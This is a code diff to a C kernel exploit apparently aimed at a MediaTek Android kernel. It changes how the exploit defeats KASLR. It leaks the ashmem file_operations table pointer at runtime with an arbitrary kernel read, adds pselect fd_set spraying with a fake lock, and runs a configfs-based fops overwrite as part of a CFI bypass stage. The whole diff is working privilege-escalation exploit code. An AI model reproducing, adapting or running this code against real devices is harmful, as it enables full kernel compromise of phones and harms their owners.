@@ -79,7 +79,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   fdset_put_word(in, 1, 0);
   fdset_put_word(in, 2, 0);
   fdset_put_word(in, 3, 0);
-  fdset_put_word(ex, 0, text_addr(INIT_TASK));
+  fdset_put_word(ex, 0, get_init_task_addr());
   fdset_put_word(ex, 1, fake_lock);
   fdset_put_word(ex, 2, 3);
   fdset_put_word(ex, 3, 0);
@@ -217,8 +217,30 @@ int refresh_fake_fops_text(int fd) {
   return 1;
 }
 
+static uint64_t rt_ashmem_fops_va = 0;
+
 int leak_kernel_base(int fd) {
-  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
+  /* The MTK image zeroes .data pointer fields, so the ashmem fops table
+   * address is not statically recoverable. Resolve it at runtime: read
+   * ashmem_misc (verified offset 0x1da6508 from ashmem_init's ADRP; minor
+   * 0xff at +0) fops pointer at +0x10, then convert the slid runtime VA to
+   * its direct-map alias using the already-known kaslr_base. */
+  if (ASHMEM_FOPS_OFF == 0) {
+    uint64_t misc_alias = p0_data_alias(KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF);
+    uint64_t fops_ptr = kernel_read64(fd, misc_alias + 0x10);
+    if (is_kernel_ptr(fops_ptr) && fops_ptr > kaslr_base) {
+      rt_ashmem_fops_va = fops_ptr;
+      uintptr_t fops_off = fops_ptr - kaslr_base;
+      kaslr_fops_alias = P0_PAGE_OFFSET | (fops_off + P0_KERNEL_PHYS_DELTA);
+      pr_info("  ashmem fops runtime-resolved: ptr=%#lx off=%#lx alias=%#lx\n",
+              fops_ptr, fops_off, kaslr_fops_alias);
+    } else {
+      pr_warning("  ashmem fops runtime resolve failed ptr=%#lx\n", fops_ptr);
+      kaslr_fops_alias = p0_data_alias(KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF);
+    }
+  } else {
+    kaslr_fops_alias = p0_data_alias(KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF);
+  }
   kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
   kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
   kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
@@ -385,7 +407,8 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
-  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
+  uint64_t original_fops = rt_ashmem_fops_va;
+  if (!original_fops) original_fops = canon_addr(ASHMEM_FOPS);
   ssize_t restore = configfs_write_once(
       fd, misc_fops, &original_fops, sizeof(original_fops));
   cfi_restore_ret = restore;
@@ -422,9 +445,12 @@ int try_cfi_stage(void) {
 
 fail:
   if (dirty) {
-    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
-    if (kaslr_done) {
-      original_fops_fail = canon_addr(ASHMEM_FOPS);
+    uint64_t original_fops_fail = rt_ashmem_fops_va;
+    if (!original_fops_fail) {
+      original_fops_fail = p0_data_alias(ASHMEM_FOPS);
+      if (kaslr_done) {
+        original_fops_fail = canon_addr(ASHMEM_FOPS);
+      }
     }
     cfi_restore_ret = configfs_write_once(
         fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
